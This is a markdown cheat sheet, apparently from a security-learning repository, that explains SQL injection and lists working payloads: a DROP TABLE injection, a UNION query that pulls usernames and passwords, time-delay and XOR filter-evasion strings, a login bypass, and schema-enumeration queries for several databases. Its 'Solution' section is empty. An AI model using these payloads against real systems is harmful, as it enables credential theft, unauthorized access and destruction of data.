<!--
 * This file is part of RS Cheat Sheets.
 *
 * RS Cheat Sheets is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * RS Cheat Sheets is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with RS Cheat Sheets. If not, see <https://www.gnu.org/licenses/>.
 */
-->

[Home](../README.md)

Todo
- Example of an SQL injection with better explanation

# SQL Injection(SQLi)
SQL injection allows an attacker to make unrequested queries or modifications to the database.

Let's assume the server makes this query with user input. `SELECT * FROM users WHERE = 'user_input';`

If the user were to input `' OR 1=1; DROP TABLE users; --` the resulting query would be `SELECT * FROM users WHERE = '' OR 1=1; DROP TABLE users; -- ';`.

This allows the user to write any SQL to the db. Everything after the `--` is commented out so the request doesn't error out.

Sometimes `#` can be used as comments instead of `--`

When sending request over the URL you can use `%20` as spaces.

## Test is the db vulnerable to SQLi
- Look for SQL keywords in source code which may tell you what they are using.
- Input single quote `'` and look for errors
- Input some SQL and see how that changes the responses. Ex: `ASCII(97)`
- Look at the response differences between `' OR 1=1; --` and `' OR 1=2; --`

Blind SQL injection are sql injections where the attacker cannot see any responses(including errors) from the database.

To solve this you can use
- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
- Out-of-bound network interactions
	- The attacker injects SQL which triggers the database to communicate with the attacker's server.

## List of good SQL attacks
- `' UNION SELECT username, password FROM users; --`
- `' OR 1=1; YOUR INJECTION HERE; --`
- Use XOR to prevent filters
	- Ex: `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
- On a login page
	- `admin'--` or `administrator'--` for the username
- Get the version of the database
	- MySQL: `SELECT VERSION();`
	- Postgres: `SELECT version();`
	- SQL Server: `SELECT @@VERSION;`
	- Oracle: `SELECT * FROM v$version`
	- SQLite: `SELECT sqlite_version();`
	- IBM Db2: `SELECT * FROM sysibm.sysversions;`
- Get all tables
	- MySQL: `SHOW TABLES;`
	- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
	- Oracle: `SELECT table_name FROM user_tables;`
	- SQLite: `SELECT name FROM sqlite_master WHERE type='table';`
	- IBM Db2: `SELECT tabname FROM syscat.tables'`
- Get all columns in a table
	- MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
	- Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
	- SQLite doesn't have this feature.
	- IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`

## Solution
